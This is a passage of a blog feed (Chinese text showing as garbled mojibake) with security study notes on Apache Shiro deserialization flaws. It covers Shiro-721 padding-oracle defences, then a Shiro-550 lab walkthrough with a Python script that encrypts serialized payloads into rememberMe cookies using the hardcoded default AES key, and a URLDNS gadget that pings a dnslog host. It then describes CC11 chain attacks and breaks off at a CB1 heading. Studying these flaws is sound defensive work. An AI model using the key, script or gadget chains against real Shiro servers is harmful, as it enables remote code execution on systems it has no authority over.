alt="image-20230717113437985"><br>è¿™ä¹Ÿå°±æ˜¯ä¸Šé¢è®²çš„ response åŒ…é‡Œä¼šå›æ˜¾ 302 ä¸” <code>rememberMe=deleteMe</code><br>ä½†æ˜¯å¯¹äº Java æ¥è¯´ï¼Œååºåˆ—åŒ–æ˜¯ä»¥ Stream çš„æ–¹å¼æŒ‰é¡ºåºè¿›è¡Œçš„ï¼Œå‘å…¶åæ·»åŠ æˆ–æ›´æ”¹ä¸€äº›å­—ç¬¦ä¸²å¹¶ä¸ä¼šå½±å“æ­£å¸¸ååºåˆ—åŒ–ã€‚åé¢çš„æµ‹è¯•ç›´æ¥è´´äº†ä¸Šé¢é‚£ä¸ªå¤§ä½¬çš„æµ‹è¯•å›¾ã€‚<br>è·å–æ­£å¸¸ç”¨æˆ·çš„ Cookie å¹¶ä½¿ç”¨å¯†é’¥è§£å¯†ï¼Œå¯ä»¥çœ‹åˆ°æœ€åå¡«å……çš„æ•°æ®ä¸º <code>0x0B</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134335.png" alt="image-20230717113452298"><br>ä¸‹é¢æˆ‘ä»¬å°†å…¶æ›´æ”¹ä¸ºå…¶ä»–åˆæ³•å¡«å……æ–¹å¼ï¼Œç„¶ååŠ å¯†å‘é€å‡ºå»<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134246.png" alt="image-20230717113459220"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171135271.png" alt="image-20230717113516223"><br>æœåŠ¡å™¨ç«¯æ­£å¸¸å“åº”ï¼Œäºæ˜¯è¿™é‡Œå°±æ„é€ å‡ºäº†å¸ƒå°”æ¡ä»¶</p><ul><li>Padding æ­£ç¡®ï¼ŒæœåŠ¡å™¨æ­£å¸¸å“åº”</li><li>Padding é”™è¯¯ï¼ŒæœåŠ¡å™¨è¿”å› <code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="é˜²å¾¡æ–¹å¼"><a href="#é˜²å¾¡æ–¹å¼" class="headerlink" title="é˜²å¾¡æ–¹å¼"></a>é˜²å¾¡æ–¹å¼</h2><ol><li>ç”±äºè¿™ç§æ–¹æ³•éœ€è¦çˆ†ç ´å¾—åˆ°keyï¼Œå› æ­¤å¯ä»¥å¯¹çŸ­æ—¶é—´å†…å¤šæ¬¡è®¿é—®çš„ipè¿›è¡Œç¦æ­¢è®¿é—®æ“ä½œï¼Œè¾¾åˆ°é˜²å¾¡ç›®çš„ã€‚</li><li>å‡çº§è‡³å®‰å…¨ç‰ˆæœ¬ã€‚</li><li>å…³é—­rememberMeæŒä¹…åŒ–ç™»å½•åŠŸèƒ½ã€‚<br>å‚è€ƒå€Ÿé‰´ï¼š<br><a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E5%9C%A8-shiro721-%E4%B8%AD%E7%9A%84-Padding-Oracle-Attack">Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="https://goodapple.top/archives/261">Javaååºåˆ—åŒ–æ¼æ´â€”â€”Shiro721 - æ«ã®Blog (goodapple.top)</a><a href="https://blog.csdn.net/qq_41874930/article/details/121314926">shiro 721 ååºåˆ—åŒ–æ¼æ´å¤ç°ä¸åŸç†ä»¥åŠPadding Oracle Attackæ”»å‡»åŠ è§£å¯†åŸç†_shiroååºåˆ—åŒ–åŸç†_Shanfenglan7çš„åšå®¢-CSDNåšå®¢</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹Shiro550</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>jdk8u65</li><li><a href="https://tomcat.apache.org/download-80.cgi">Tomcat8</a></li><li>shiro 1.2.4<br>æ¼æ´å½±å“ç‰ˆæœ¬ï¼šShiro &lt;&#x3D; 1.2.4<br>ç¯å¢ƒå…·ä½“çš„é…ç½®å‚è€ƒï¼š<a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">Javaååºåˆ—åŒ–Shiroç¯‡01-Shiro550æµç¨‹åˆ†æ | Drunkbabyâ€™s Blog (drun1baby.top)</a></li></ul><h2 id="shiro-550åˆ†æ"><a href="#shiro-550åˆ†æ" class="headerlink" title="shiro-550åˆ†æ"></a>shiro-550åˆ†æ</h2><p>å“ï¼Œç»ˆäºåˆ°äº†shiroï¼Œè™½ç„¶å¾ˆå°‘é‡åˆ°è¿™ä¸ªæ¼æ´ä½†æ˜¯è¿™ä¸ªè¿˜æ˜¯æŒºé‡è¦çš„<br>æŠ“ä¸ªç™»å½•çš„åŒ…ï¼Œå‹¾é€‰ RememberMe å­—æ®µ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171119869.png" alt="image-20230717111933757"><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªcookieæ˜æ˜¾æ˜¯é€šè¿‡åŠ å¯†çš„ï¼Œé‚£ä¹ˆå°±å»åˆ†æä¸€ä¸‹è¿™ä¸ªcookieçš„ç”Ÿæˆè¿‡ç¨‹ï¼Œidaeé‡Œé¢æŒ‰ä¸¤ä¸‹shiftå¯ä»¥è¾“å…¥cookieç„¶åä¼šæŠŠå’Œcookieè¿™ä¸ªåå­—æœ‰å…³çš„ç±»åˆ—å‡ºæ¥ï¼Œæœ€ç»ˆæˆ‘ä»¬æ‰¾åˆ°äº†<code>CookieRememberMeManager</code>ç±»ä¸­çš„ <code>getRememberedSerializedIdentity()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171120300.png" alt="image-20230717112028101"><br>è¿™ä¸ªæ–¹æ³•å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºhttpè¯·æ±‚ï¼Œå¦‚æœæ˜¯åˆ™ä¼šè·å–remember meçš„cookieå€¼ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯deleteMeï¼Œä¸æ˜¯åˆ™åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¦åˆ base64 ç¼–ç ï¼Œç„¶åå†å¯¹å…¶è¿›è¡Œ base64 è§£ç ï¼Œå°†è§£ç ç»“æœè¿”å›ï¼Œé‚£ä¹ˆå¾€ä¸Šæ‰¾è°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171120849.png" alt="image-20230717112037436"><br>æ‰¾åˆ°äº†<code>AbstractRememberMeManager</code> è¿™ä¸ªç±»çš„ <code>getRememberedPrincipals()</code> æ–¹æ³•ï¼Œè¿™é‡Œè¦æŠŠå¯¹åº”çš„æºç ä¸‹è½½find usagesæ‰èƒ½æœåˆ°ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨åŸŸä¸º <strong>PrincipalCollection</strong>ï¼Œä¸€èˆ¬å°±æ˜¯ç”¨äºèšåˆå¤šä¸ª Realm é…ç½®çš„é›†åˆã€‚393è¡Œå°† HTTP Requests é‡Œé¢çš„ Cookie æ‹¿å‡ºæ¥ï¼Œèµ‹å€¼ç»™ bytes æ•°ç»„ï¼›396 è¡Œå°† bytes æ•°ç»„çš„ä¸œè¥¿è¿›è¡Œ <code>convertBytesToPrincipals()</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œå¹¶å°†å€¼èµ‹ç»™ principals å˜é‡ï¼Œ<code>convertBytesToPrincipals</code>æ–¹æ³•å°†ä¹‹å‰çš„ bytes æ•°ç»„è½¬æ¢æˆäº†è®¤è¯ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹å…¶è¿›è¡Œè§£å¯†å’Œååºåˆ—åŒ–<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121265.png" alt="image-20230717112102085"></p><h3 id="decrypt-è§£å¯†"><a href="#decrypt-è§£å¯†" class="headerlink" title="decrypt()è§£å¯†"></a>decrypt()è§£å¯†</h3><p>æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹<code>decrypt()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121435.png" alt="image-20230717112126287"><br>487 è¡Œè¿™é‡Œè·å–äº†å¯†é’¥æœåŠ¡ï¼Œå†å¾€å 489 è¡Œçš„ <code>decrypt()</code> è·Ÿè¿›å»ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ªæ¥å£ã€‚æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹å®ƒçš„å‚æ•°åç¬¬ä¸€ä¸ªè¦åŠ å¯†çš„æ•°ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ª keyï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121534.png" alt="image-20230717112158412"><br>å›åˆ°ä¹‹å‰ <code>decrypt()</code> æ–¹æ³•çš„ç¬¬ 489 è¡Œï¼Œä¸¤ä¸ªä¼ å‚ï¼Œç¬¬ä¸€ä¸ªæ˜¯åŠ å¯†å­—æ®µï¼Œç¬¬äºŒä¸ªæ˜¯ keyï¼Œè·Ÿè¿›ä¼ å…¥çš„ <code>getDecryptionCipherKey()</code>æœ€ç»ˆå‘ç°å®ƒæ˜¯ä¸€ä¸ªè¿”å›çš„å¸¸é‡<code>decryptionCipherKey</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122240.png" alt="image-20230717112212188"><br>ç„¶åfind usageså¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†å®ƒï¼Œåœ¨åŒç±»ä¸‹çš„<code>setDecryptionCipherKey()</code>é‡Œæ‰¾åˆ°äº†å®ƒçš„è°ƒç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122098.png" alt="image-20230717112221010"><br>ç„¶åå†æ‰¾ä¸€ä¸‹<code>setDecryptionCipherKey()</code>çš„è°ƒç”¨ï¼Œåœ¨åŒç±»ä¸‹çš„<code>setCipherKey()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122213.png" alt="image-20230717112229102"><br>ç„¶åç»§ç»­çœ‹å“ªé‡Œè°ƒç”¨äº†<code>setCipherKey()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122886.png" alt="image-20230717112241693"><br>åˆ°è¿™é‡Œè·Ÿè¿›å»å‘ç°<code>DEFAULT_CIPHER_KEY_BYTES</code>æ˜¯ä¸ªå›ºå®šçš„å€¼<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122054.png" alt="image-20230717112257933"><br>ä¹Ÿå°±æ˜¯è¯´åœ¨Shiro1.2.4 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­å¯¹remember meåŠ å¯†çš„keyæ˜¯ä¸€ä¸ªå›ºå®šçš„keyï¼Œå…¶å®åŠ å¯†ç®—æ³•å°±æ˜¯AESåŠ å¯†</p><h3 id="deserializeååºåˆ—åŒ–"><a href="#deserializeååºåˆ—åŒ–" class="headerlink" title="deserializeååºåˆ—åŒ–"></a>deserializeååºåˆ—åŒ–</h3><p>æ¥åˆ°ä¸€å¼€å§‹çš„<code>convertBytesToPrincipals()</code>æ–¹æ³•æ‰¾åˆ°<code>deserialize()</code>æ–¹æ³•ç‚¹è¿›æ¥åˆ°ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123340.png" alt="image-20230717112312266"><br>è¿™é‡Œå†ç‚¹è¿›å»å…¶å®æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç„¶åç»§ç»­æŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123313.png" alt="image-20230717112319911"><br>åœ¨shiroåŒ…çš„<code>deserialize</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>readObject()</code>æ–¹æ³•åé¢å°±ä¼šè¿›åˆ°HashMapè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å…¥å£ï¼Œåˆ°è¿™é‡Œè§£å¯†çš„è¿‡ç¨‹å°±ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥å»è·Ÿä¸€ä¸‹åŠ å¯†çš„è¿‡ç¨‹</p><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>åŠ å¯†é€šè¿‡è°ƒè¯•æ¥åˆ†æï¼Œæ–­ç‚¹ä¸‹åœ¨å¦‚ä¸‹å›¾<code>onSuccessfulLogin()</code>ä½ç½®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123238.png" alt="image-20230717112334025"><br>è¿™é‡Œæ€ä¹ˆè¿›åˆ°è¿™ä¸ªæ–­ç‚¹å‘¢ï¼Ÿå°±æ˜¯æˆ‘ä»¬åœ¨ä¸€å¼€å§‹ç™»å½•çš„é¡µé¢å¼€å¯ä»£ç†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123328.png" alt="image-20230717112344273"><br>å½“æ–­ç‚¹ä¸‹å¥½ä¹‹åç‚¹å‡»sign inå³å¯åˆ°æ–­ç‚¹ä½ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ç”¨burpå‘åŒ…å¼€å§‹è°ƒè¯•ï¼Œåœ¨å¦‚ä¸‹ä½ç½®å¯¹æ˜¯å¦ç‚¹å‡»äº†Remember Meè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚ä¸‹ç‚¹å‡»äº†ä¼šå°†rememberMeèµ‹å€¼ä¸ºtrue<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124686.png" alt="image-20230717112404419"><br>ç„¶ååˆ°è¿™ä¸ªrememberIdentityæ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯ç”¨äºç”¨æˆ·åèµ‹å€¼ä¿å­˜ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¸€ç³»åˆ—è°ƒç”¨å®Œä¹‹åå¾—åˆ°äº†ç”¨æˆ·å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124274.png" alt="image-20230717112417095"><br>ç„¶åè¿›å…¥åˆ°rememberIdentityæ–¹æ³•ç»§ç»­çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124709.png" alt="image-20230717112426588"><br>è¿™é‡Œçš„convertPrincipalsToByteså’Œä¹‹å‰è§£å¯†çš„<code>convertBytesToPrincipals()</code>éå¸¸ç›¸ä¼¼ä¸è¿‡è§£å¯†å˜ä¸ºäº†åŠ å¯†ï¼Œååºåˆ—åŒ–å˜ä¸ºäº†åºåˆ—åŒ–<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124313.png" alt="image-20230717112440188"><br>ç„¶åè¿›å…¥åˆ°åºåˆ—åŒ–çš„è¿™é‡Œï¼ˆåˆ°ä¸Šé¢è¿™ä¸€æ­¥ä¹‹åä¸€ç›´F7å°±è¡Œï¼‰å¯ä»¥çœ‹åˆ°å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸€æ ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124472.png" alt="image-20230717112451267"><br>ç„¶åå›åˆ° encrypt åŠ å¯†è¿™é‡Œï¼Œè¿›å…¥<code>getEncryptionCipherKey()æ–¹æ³•</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125880.png" alt="image-20230717112500712"><br>ä¸€ç›´è·Ÿä¸‹å»ä¹‹åå‘ç°æœ€åè°ƒç”¨çš„keyå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ‰¾åˆ°çš„é‚£ä¸ªå¸¸é‡<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125038.png" alt="image-20230717112509939"><br>cookieé€šè¿‡AESåŠ å¯†ä¹‹åå†base64å¾—åˆ°ï¼Œåˆ°è¿™é‡Œå·®ä¸å¤šåˆ†æç»“æŸ</p><h2 id="Shiro-550-æ¼æ´åˆ©ç”¨"><a href="#Shiro-550-æ¼æ´åˆ©ç”¨" class="headerlink" title="Shiro-550 æ¼æ´åˆ©ç”¨"></a>Shiro-550 æ¼æ´åˆ©ç”¨</h2><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªæ’ä»¶åä¸ºMaven Helperåˆ†æpom.xml<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125398.png" alt="image-20230717112524077"><br>å…¶å®è¿™é‡Œæœ‰å¾ˆå¤šåŒ…åœ¨testä¸‹ï¼Œçœ‹ç»„é•¿çš„è§†é¢‘è¯´testæ˜¯æ‰“ä¸åˆ°çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„æ’ä»¶æ²¡æœ‰æ˜¾ç¤ºå¾ˆå¥‡æ€ª</p><h3 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h3><p>è¿™é‡Œæˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±æ˜¯ç›´æ¥æ›¿æ¢åŠ å¯†åçš„cookieï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸€ä¸ªåŠ å¯†çš„è„šæœ¬ï¼Œè¿™é‡Œç›´æ¥ç”¨Drunkbabyå¸ˆå‚…çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ï¼*-* coding:utf-8  </span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36  </span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby  </span></span><br><span class="line"><span class="comment"># @FileName: poc.py  </span></span><br><span class="line"><span class="comment"># @Software: VSCode  </span></span><br><span class="line"><span class="comment"># @Blog    ï¼šhttps://drun1baby.github.io/  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base  </span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> mode  </span><br><span class="line"><span class="keyword">import</span> uuid  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):  </span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">  data = f.read()  </span><br><span class="line"> <span class="keyword">return</span> data  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):  </span><br><span class="line"> BS = AES.block_size  </span><br><span class="line"> pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()  </span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>  </span><br><span class="line"> mode = AES.MODE_CBC  </span><br><span class="line"> iv = uuid.uuid4().<span class="built_in">bytes</span>  </span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)  </span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))  </span><br><span class="line"> <span class="keyword">return</span> ciphertext  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):  </span><br><span class="line"> enc_data = base64.b64decode(enc_data)  </span><br><span class="line"> unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]  </span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>  </span><br><span class="line"> mode = AES.MODE_CBC  </span><br><span class="line"> iv = enc_data[:<span class="number">16</span>]  </span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)  </span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])  </span><br><span class="line"> plaintext = unpad(plaintext)  </span><br><span class="line"> <span class="keyword">return</span> plaintext  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line"> data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)  </span><br><span class="line"> <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure><p>ç„¶åå› ä¸ºURLSDNSè¿™æ¡é“¾ä¸ä¾èµ–äºCCåŒ…ï¼Œæ‰€ä»¥ç”¨æ¥éªŒè¯æ¼æ´ï¼Œé‚£ä¹ˆå…ˆå°†payloadé€šè¿‡AESåŠ å¯†ç„¶åbase64ï¼Œexpå¦‚ä¸‹æ˜¯ä¹‹å‰è·ŸURLDNSè¿™æ¡é“¾å­å†™çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//å…¥å£ç±»  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//è°ƒç”¨é“¾ä¸­çš„ç±»  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c3j32r.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡åå°„è·å–åˆ°urlä¸­çš„hashcodeå±æ€§  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">//hashcodeä¸ºç§æœ‰å±æ€§ï¼Œé€šè¿‡ä¸‹é¢æ–¹æ³•è®¾ç½®ä¸ºå¯æ“ä½œ  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™é‡Œåœ¨putå‰éœ€è¦å°†hashCodeå€¼æ”¹ä¸€ä¸‹ï¼Œä¸ç„¶putæ–¹æ³•ä¹Ÿä¼šè¯·æ±‚dnsï¼Œè¿™æ ·ä¸ç®¡æœ‰æ²¡æœ‰ååºåˆ—åŒ–éƒ½ä¼šè¯·æ±‚dns  </span></span><br><span class="line"></span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//é‡æ–°è®¾ï¼Œé¿å…æ··æ·†  </span></span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//æ”¹å›ï¼Œä¸ç„¶è¿™æ¡é“¾å°±ä¸èƒ½åˆ©ç”¨  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿›è¡Œåºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        w.writeObject(hashMap);</span><br><span class="line">        System.out.println(w);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿›è¡Œååºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        o.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åååºåˆ—åŒ–é‚£é‡Œå…ˆæ³¨é‡Šæ‰ï¼Œç›´æ¥åºåˆ—åŒ–å¾—åˆ°ser.binï¼Œç„¶åæŠŠè¿™ä¸ªåºåˆ—åŒ–çš„æ•°æ®æ”¾åˆ°åŠ å¯†è„šæœ¬é‡Œé¢è·‘å¾—åˆ°åŠ å¯†cookie<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125072.png" alt="image-20230717112539038"><br>æœ€åæŠŠè¿™æ®µcookieæ›¿æ¢æ‰åŸæ¥çš„cookieï¼Œä¸»è¦è¿™é‡Œçš„JSESSIONIDè¿™æ®µæ•°æ®ä¸€å®šè¦åˆ ä¸ç„¶ä¸ä¼šå»è¯»rememberMe<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125588.png" alt="image-20230717112546537"><br>å‘åŒ…ä¹‹åæ”¶åˆ°DNSè¯·æ±‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125433.png" alt="image-20230717112554385"><br>æ¥ä¸‹æ¥å°±æ˜¯æ¢ä¸åŒçš„é“¾å°è¯•æ”»å‡»</p><h3 id="é€šè¿‡-CC11-é“¾æ”»å‡»"><a href="#é€šè¿‡-CC11-é“¾æ”»å‡»" class="headerlink" title="é€šè¿‡ CC11 é“¾æ”»å‡»"></a>é€šè¿‡ CC11 é“¾æ”»å‡»</h3><p>è¿˜æ˜¯ç”¨ä¹‹å‰çš„CC11é“¾å­æ”»å‡»ï¼Œå…ˆåºåˆ—åŒ–ser.binç„¶ååŠ å¯†å‘åŒ…å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171126559.png" alt="image-20230717112603459"></p><h3 id="é€šè¿‡-CB1-é“¾æ”»å‡»"><a href="#é€šè¿‡-CB1-é“¾æ”»å‡»" class="headerlink" title="é€šè¿‡ CB1 é“¾æ”»å‡»"></a>é€šè¿‡ CB1 